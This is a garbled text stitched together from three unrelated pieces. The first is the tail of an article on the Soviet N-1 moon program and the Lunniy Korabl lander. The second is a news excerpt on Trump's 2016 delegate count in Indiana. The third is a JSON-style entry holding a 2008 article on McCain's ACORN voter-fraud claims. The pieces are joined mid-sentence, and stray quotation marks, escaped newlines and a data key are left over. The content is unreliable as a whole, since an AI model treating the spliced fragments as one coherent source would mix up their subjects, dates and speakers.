they were even trying. Once the Americans landed on the Moon, it became common for the Soviet leadership to deny that they had been in a race at all. The Americans were foolish, they claimed, and wasted a lot of money racing themselves. In contrast, the wise Soviets instead used robotic spacecraft to return lunar samples and rove the surface. Despite the fact that there were also contradictory statements from Soviet officials and even cosmonauts, this narrative gained traction in the Western media, and even space fan Walter Cronkite embraced it. Any American evidence to the contrary, in the form of reconnaissance photos of the massive Moon rocket launch site at the Baikonur Cosmodrome, was highly classified. In August 1989 the Soviet newspaper Izvestia published an article with substantial details about the N-1 lunar rocket program. Rough translations quickly appeared in the West. But a bigger revelation happened in November 1989 when a group of engineering professors from the Massachussetts Institute of Technology and California Institute of Technology visited the Moscow Aviation Institute and saw a strange-looking craft. An MIT engineer, Laurence R. Young, recounted the visit in an interview with John Noble Wilford, of the New York Times. “It was one of the most dramatic moments that I can remember,” Young said. “I said, ‘What is that?’ And they said, ‘Oh, that is the lunar lander.’ All the pieces were there, and they explained to us which part was connected to which other.” It was not a mockup, but flight hardware. MIT acting dean of engineering Jack L. Kerrebrock returned the next day and took photographs. The photos were soon published in various media and suddenly Westerners—and the Russian public as well—saw what the Soviet Union had been trying to do, and had kept hidden for decades. Godspeed, Lunniy Korabl, it was great to finally meet you. The descriptions of the Soviet lunar effort that emerged in the late 1980s and early 1990s were garbled and not totally accurate. For example, the initial account that the visiting MIT group was told was that the Soviet lunar mission would have involved two rocket launches and a rendezvous in orbit. This was untrue and it took several years for a more accurate account to emerge. The most authoritative Western account came in 2000 with Asif Siddiqi’s monumental book Challenge to Apollo. Although much new material has emerged since then, Siddiqi’s book remains the best English-language source on that subject. In a sign of how much had changed since the Cold War space race, Siddiqi’s book was published by NASA, a sign of respect to the agency’s former rivals. Relations between Russia and the United States have soured in recent years. But politics is often cyclical, and the current chill will eventually thaw… someday. Perhaps when that happens, the lunar ship will again venture out on another voyage, not into space, but to another country, where space enthusiasts of a certain age can look at it in wonder, and dismay. Considering the rickety nature of the craft, it is better suited to horizontal travel than vertical. Godspeed, Lunniy Korabl, it was great to finally meet you. Home",

But Trump is not expected to reach the necessary 1,237 delegates, which means the convention is expected to go to a second ballot, where delegates are free to vote for anyone.\n\nThat means Trump is expected to get little to no support from Indiana, and plenty of other states, on any subsequent ballots.\n\n“If Satan had the lead on him and was one delegate away from being nominated as our candidate, and Donald Trump was the alternative, I might vote for Donald Trump,” Craig Dunn, a local Republican running for delegate told Politico. “I’ve always wanted to own a casino, but he couldn’t give me a casino and have me vote for him.”\n\n“I believe we need a candidate that is likable, and I believe we need a candidate that is electable. And at this point, I have not seen any evidence for a general election that Donald Trump is electable,” Kyle Babcock, who’s also running for delegate, told Politico.\n\nThe 27 delegates that will be selected Saturday include three from each district.

  "latent_32717": "Turley: 'GOP challenges look like suppression' David Edwards and Andrew McLemore\n\nPublished: Saturday October 18, 2008\n\nPrint This Email This The McCain campaign's allegations of voter fraud \"look like\" an attempt to suppress voting in battleground states, said a professor of George Washington University.\n\nProfessor Jonathan Turley said there is an \"uncanny similarity in term of timing,\" drawing a comparison with voting scandals shortly before the previous two presidential elections.\n\n\"I think it is fair to say that some of these challenges do look like suppression efforts,\" Turley said in an interview on MSNBC. \"So I think there is really grounds to be concerned here.\"\n\nThe allegations of voter fraud made by the McCain campaign about ACORN and Sen. Obama's alleged connections to it sound similar to another scandal during President Bush's administration, said Robert Bauer, a lawyer or the Obama campaign.\n\n\"This is an astonishing repeat of the kind of toxic intrusion of politics into the lawful administration of justice that we saw during the U.S. attorney scandal,\" Bauer said. \"We're seeing a repeat of that.\"\n\nThe Obama campaign asked Friday for a federal investigation into whether the Bush administration and the McCain campaign have been illegally working together to spread \"unsupported, spurious allegations of voter fraud.\"\n\nThe campaign's attorney wrote the request to Attorney General Michael Mukasey after learning from an Associated Press report that the FBI is investigating the controversial organization ACORN, Bloomberg reported.\n\nIn Wednesday's final presidential debate, McCain insinuated that Obama is involved with the organization and claimed it is attempting to sway the November election.\n\n\"We need to know the full extent of Sen. Obama's relationship with ACORN, who is now on the verge of maybe perpetrating maybe one of the greatest frauds in voter history in this country, maybe destroying the fabric of democracy,\" McCain said.\n\nDemocrats and Barack Obama have attacked the controversy as ridiculous political mudslinging, the Associated Press reported.\n\nThe Association of Community Organizations for Reform Now, known as ACORN, has championed liberal causes since 1970. This year, ACORN hired more than 13,000 part-time workers and sent them out in 21 states to sign up voters in minority and poor neighborhoods.\n\nMSNBC's Rachel Maddow suggested the McCain campaign's allegations are an attempt to reduce the turnout of newly registered voters, most of whom are Democrats.\n\n\"To keep turnout low, prevent votes from being counted and scare voters into thinking there are massive voting shenanigans and that their vote won't count anyway,\" Maddow said.\n\nThe MSNBC host cited a comment from Steve Schmidt, McCains chief strategist as an implication of their plan.\n\n\"The scenario for winning for us is a narrow-victory scenario,\" Schmidt said in an interview with The New York Times.\n\nThis video is from MSNBC's The Rachel Maddow Show, broadcast October 17, 2008.\n\nDownload video via RawReplay.com"
